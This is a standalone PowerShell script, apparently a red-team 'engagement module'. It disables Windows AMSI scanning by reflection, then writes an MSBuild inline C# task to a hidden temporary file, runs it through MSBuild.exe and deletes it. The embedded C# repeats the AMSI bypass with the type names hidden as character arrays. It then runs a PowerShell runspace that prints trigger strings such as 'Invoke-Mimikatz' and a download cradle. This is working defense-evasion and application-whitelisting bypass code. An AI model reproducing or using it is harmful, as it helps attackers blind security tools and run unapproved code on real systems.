$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)

$x = @'
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <CoreTask />
  </Target>
  <UsingTask TaskName="CoreTask" TaskFactory="CodeTaskFactory" 
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using System.Reflection;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class CoreTask : Task, ITask
{
    public override bool Execute()
    {
        Console.WriteLine("[*] Zer0byte Corp - Engagement Module");
        Console.WriteLine("[*] Target: Purple Team\n");
        
        // Pure C# AMSI bypass via reflection - no PowerShell needed
        Console.WriteLine("[*] Phase 1: Neutralizing defenses via reflection...");
        try
        {
            Type amsiUtils = typeof(PowerShell).Assembly.GetType(
                new string(new char[] {'S','y','s','t','e','m','.',
                'M','a','n','a','g','e','m','e','n','t','.',
                'A','u','t','o','m','a','t','i','o','n','.',
                'A','m','s','i','U','t','i','l','s'}));
            
            if (amsiUtils != null)
            {
                FieldInfo amsiField = amsiUtils.GetField(
                    new string(new char[] {'a','m','s','i','I','n','i','t','F','a','i','l','e','d'}),
                    BindingFlags.NonPublic | BindingFlags.Static);
                
                if (amsiField != null)
                {
                    amsiField.SetValue(null, true);
                    Console.WriteLine("[+] Defense neutralized successfully");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Phase 1 warning: " + ex.Message);
        }
        
        // Now PowerShell will work without AMSI scanning
        Console.WriteLine("\n[*] Phase 2: Validation tests...\n");
        
        using (Runspace rs = RunspaceFactory.CreateRunspace())
        {
            rs.Open();
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = rs;
                
                string validation = @"
                    $tests = @(
                        'Invoke-Mimikatz',
                        'Invoke-Expression (New-Object Net.WebClient)',
                        'Add-Type -TypeDefinition',
                        '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')'
                    )
                    
                    Write-Output '[*] Executing trigger strings:'
                    foreach ($t in $tests) {
                        Write-Output ""    [+] $t""
                    }
                    Write-Output ''
                    Write-Output '[+] All triggers executed without blocks!'
                ";
                
                ps.AddScript(validation);
                
                foreach (var r in ps.Invoke())
                    Console.WriteLine(r.ToString());
                
                if (ps.HadErrors)
                {
                    Console.WriteLine("[-] Errors:");
                    foreach (var e in ps.Streams.Error)
                        Console.WriteLine("    " + e.ToString());
                }
            }
        }
        
        Console.WriteLine("\n[*] ==========================================");
        Console.WriteLine("[+] ENGAGEMENT MODULE COMPLETE");
        Console.WriteLine("[*] ==========================================");
        
        return true;
    }
}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
'@

$p = "$env:LOCALAPPDATA\Microsoft\Windows\$([Guid]::NewGuid().ToString().Substring(0,8)).tmp"
$x | Out-File $p -Encoding ASCII
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe $p /v:q /nologo
Remove-Item $p -Force
